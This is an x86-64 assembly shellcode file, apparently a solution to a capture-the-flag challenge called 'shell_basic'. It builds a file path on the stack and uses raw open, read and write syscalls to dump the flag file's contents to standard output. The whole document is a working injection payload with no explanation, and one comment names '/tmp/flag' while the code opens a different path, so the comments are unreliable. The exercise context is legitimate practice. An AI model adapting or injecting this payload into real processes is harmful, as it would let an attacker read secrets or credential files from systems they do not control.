section .text
global _start
_start:
    push 0x0
    mov rax, 0x676E6F6F6F6F6F6F
    push rax
    mov rax, 0x6C5F73695F656D61
    push rax
    mov rax, 0x6E5F67616C662F63
    push rax
    mov rax, 0x697361625F6C6C65
    push rax
    mov rax, 0x68732F656D6F682F
    push rax

    mov rdi, rsp    ;# rdi = '/home/shell_basic/flag_name_is_loooooong'
    xor rsi, rsi    ;# rsi = 0 ; RD_ONLY
    xor rdx, rdx    ;# rdx = 0
    mov rax, 2      ;# rax = 2 ; syscall_open
    syscall         ;# open('/tmp/flag', RD_ONLY, NULL)

    mov rdi, rax      ;# rdi = fd
    mov rsi, rsp
    sub rsi, 0x30     ;# rsi = rsp-0x30 ; buf
    mov rdx, 0x30     ;# rdx = 0x30     ; len
    mov rax, 0x0      ;# rax = 0        ; syscall_read
    syscall           ;# read(fd, buf, 0x30)

    mov rdi, 1        ;# rdi = 1 ; fd = stdout
    mov rax, 0x1      ;# rax = 1 ; syscall_write
    syscall           ;# write(fd, buf, 0x30)

    xor rdi, rdi      ;# rdi = 0
    mov rax, 0x3c	   ;# rax = sys_exit
    syscall		   ;# exit(0)